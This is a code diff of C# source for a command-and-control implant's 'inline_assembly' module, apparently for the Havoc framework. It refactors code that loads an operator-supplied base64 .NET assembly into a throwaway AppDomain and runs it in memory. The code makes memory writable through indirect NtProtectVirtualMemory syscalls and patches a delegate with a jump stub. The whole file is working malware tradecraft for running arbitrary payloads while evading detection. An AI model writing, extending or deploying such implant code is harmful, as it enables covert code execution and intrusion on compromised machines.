@@ -1,7 +1,6 @@
 using System;
-using System.Net;
 using System.IO;
-using System.Threading;
+using System.Threading.Tasks;
 using System.Collections.Generic;
 using System.Reflection;
 using System.Linq;
@@ -9,45 +8,49 @@ using System.Text;
 using System.Runtime.CompilerServices;
 using System.Runtime.InteropServices;
 using HavocImplant.NativeUtils;
+using System.Net;
+
 namespace HavocImplant.AgentFunctions
 {
-    public class InlineAssembly
+    public class InlineAssembly : CommandInterface
     {
-        static string output;
+        public override string Command => "inline_assembly";
+        public override bool Dangerous => true;
         // Darkmelkor
-        public static void Run(Implant agent, string taskInfo, int taskId)
+        public override async Task Run(int taskId)
         {
-            byte[] assembly_bytes = Convert.FromBase64String(taskInfo.Split(new char[] { ';' }, 2)[0].Substring(5));
-            //Console.WriteLine($"Assembly is {assembly_bytes.Length} bytes long");
-            string[] args = taskInfo.Split(new char[] { ';' }, 2)[1].Split(' ');
-            string output = "";
+            Output = "";
+            byte[] assembly_bytes = Convert.FromBase64String(Agent.taskingInformation[taskId].taskFile);
+
+            string args = Agent.taskingInformation[taskId].taskArguments;
             try
             {
-                output = Sacrificial.loadAppDomainModule(assembly_bytes, args);
+                Output = Sacrificial.loadAppDomainModule(assembly_bytes, args);
             }
             catch (Exception ex)
             {
             }
-            agent.taskingInformation[taskId] = new Implant.task(agent.taskingInformation[taskId].taskCommand, ($"[+] Output for [inline_assembly]\n" + output).Replace("\\", "\\\\").Replace("\"", "\\\""));
-            
+            ReturnOutput(taskId);
         }
     }
-        class Sacrificial
+    class Sacrificial
     {
         
         static dll ntdll = globalDll.ntdll;
-        public static string loadAppDomainModule(Byte[] bMod, string[] args)
+        public static string loadAppDomainModule(Byte[] bMod, string args)
         {
-
+            Console.WriteLine($"Assembly is {bMod.Length} bytes long");
             string pathToDll = Assembly.GetExecutingAssembly().CodeBase;
             AppDomainSetup domainSetup = new AppDomainSetup { PrivateBinPath = pathToDll };
             AppDomain isolationDomain = AppDomain.CreateDomain(Guid.NewGuid().ToString());
-            isolationDomain.SetData("str", String.Join(" ", args));
+            isolationDomain.SetData("str", args);
+            Console.WriteLine($"Getting initial data: {isolationDomain.GetData("str")}");
             try
             {
                 isolationDomain.Load(bMod);
             }
             catch { }
+            Console.WriteLine("Loaded");
             var Sleeve = new CrossAppDomainDelegate(Console.Beep);
             var Ace = new CrossAppDomainDelegate(ActivateLoader);
 
@@ -65,7 +68,7 @@ namespace HavocImplant.AgentFunctions
             patch[2] = 12;
 
             object[] protArgs = new object[] { (IntPtr)(-1), codeSleeve, (IntPtr)12, (uint)0x4, (uint)0 };
-            ntdll.indirectSyscallInvoke<Delegates.NtProtectVirtualMemory>("NtProtectVirtualMemory", protArgs);
+            Console.WriteLine("ntstatus for protect: 0x{0:X}", (uint)ntdll.indirectSyscallInvoke<Delegates.NtProtectVirtualMemory>("NtProtectVirtualMemory", protArgs));
 
             Marshal.WriteByte(codeSleeve, 0x48);
             Marshal.WriteByte(IntPtr.Add(codeSleeve, 1), 0xb8);
@@ -74,8 +77,8 @@ namespace HavocImplant.AgentFunctions
             Marshal.WriteByte(IntPtr.Add(codeSleeve, patch[1]), 0xe0);
 
             protArgs[3] = (uint)0x20;
-            ntdll.indirectSyscallInvoke<Delegates.NtProtectVirtualMemory>("NtProtectVirtualMemory", protArgs);
-
+            Console.WriteLine("ntstatus for protect: 0x{0:X}", (uint)ntdll.indirectSyscallInvoke<Delegates.NtProtectVirtualMemory>("NtProtectVirtualMemory", protArgs));
+            Console.WriteLine("Doing callback");
             try
             {
                 isolationDomain.DoCallBack(Sleeve);
@@ -89,11 +92,12 @@ namespace HavocImplant.AgentFunctions
 
         static void ActivateLoader()
         {
+            Console.WriteLine("Activating");
             string str = AppDomain.CurrentDomain.GetData("str") as string;
             string output = "";
             foreach (var asm in AppDomain.CurrentDomain.GetAssemblies())
             {
-                if (!asm.FullName.Contains("mscor"))
+                if (!asm.FullName.ToLower().Contains("mscor"))
                 {
                     TextWriter realStdOut = Console.Out;
                     TextWriter realStdErr = Console.Error;
@@ -101,7 +105,7 @@ namespace HavocImplant.AgentFunctions
                     TextWriter stdErrWriter = new StringWriter();
                     Console.SetOut(stdOutWriter);
                     Console.SetError(stdErrWriter);
-                    var result = asm.EntryPoint.Invoke(null, new object[] { new string[] {str } });
+                    var result = asm.EntryPoint.Invoke(null, new object[] { new string[] { str } });
 
                     Console.Out.Flush();
                     Console.Error.Flush();
@@ -113,7 +117,6 @@ namespace HavocImplant.AgentFunctions
                 }
             }
             AppDomain.CurrentDomain.SetData("str", output);
-
         }
 
         public static void unloadAppDomain(AppDomain oDomain)
